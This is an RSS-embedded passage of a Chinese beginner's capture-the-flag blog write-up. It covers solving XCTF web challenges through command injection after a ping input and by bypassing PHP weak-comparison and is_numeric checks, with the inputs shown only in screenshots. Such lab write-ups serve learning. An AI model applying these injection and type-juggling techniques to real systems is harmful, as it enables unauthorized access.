&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1103.png&#34;
	width=&#34;1024&#34;
	height=&#34;691&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1103_hu10313762767641247360.png 480w, https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1103_hu7606024388000548274.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;148&#34;
		data-flex-basis=&#34;355px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;进去之后找到了flag.txt:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1107.png&#34;
	width=&#34;1024&#34;
	height=&#34;691&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1107_hu4237145846342640491.png 480w, https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1107_hu7456008183527163777.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;148&#34;
		data-flex-basis=&#34;355px&#34;
	
&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;第十一题-command-execution&#34;&gt;第十一题 command execution
&lt;/h3&gt;&lt;p&gt;ping？再次上网找资料，发现这个题要考windows命令操作，对照着手册缓缓地输入了127.0.0.1来进入本地，ls访问目录，然后再找flag.txt,最后把flag找出来。操作手册看得头懵。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1105.png&#34;
	width=&#34;714&#34;
	height=&#34;549&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1105_hu3359105447948750008.png 480w, https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1105_hu17690909166971310649.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;130&#34;
		data-flex-basis=&#34;312px&#34;
	
&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;第十二题-simple_php&#34;&gt;第十二题 simple_php
&lt;/h3&gt;&lt;p&gt;既然是php写的代码，就要看看代码的意思了。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1106.png&#34;
	width=&#34;385&#34;
	height=&#34;588&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1106_hu954467267764787806.png 480w, https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1106_hu1998431756636094590.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;65&#34;
		data-flex-basis=&#34;157px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;在不停的查询之后，了解到，第一个if，因为只用了两个等号，那么判定为弱比较，只要开头是0就行，而且后面不能全部为数字，那就带几个字母。
第二个if要知道这个函数判断b是否为数字。
第三个if，b是一个大于1234的数，后面还要加上一些字母。
保存一下学php的教程，然后缓缓地在url框输入点东西：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1102.png&#34;
	width=&#34;944&#34;
	height=&#34;701&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1102_hu4921077874252286799.png 480w, https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1102_hu7883867240752764205.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;134&#34;
		data-flex-basis=&#34;323px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;终于搞完了flag&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;有一说一，要想做题，真的要学好多东西，各种各样的知识。学会好好利用网络资源很重要。
&lt;del&gt;一瘸一拐的在网络知识的帮助下终于懵懵懂懂的搞完了这几个题。&lt;/del&gt;&lt;/p&gt;
</description>
        </item>
        
    </channel>
</rss>
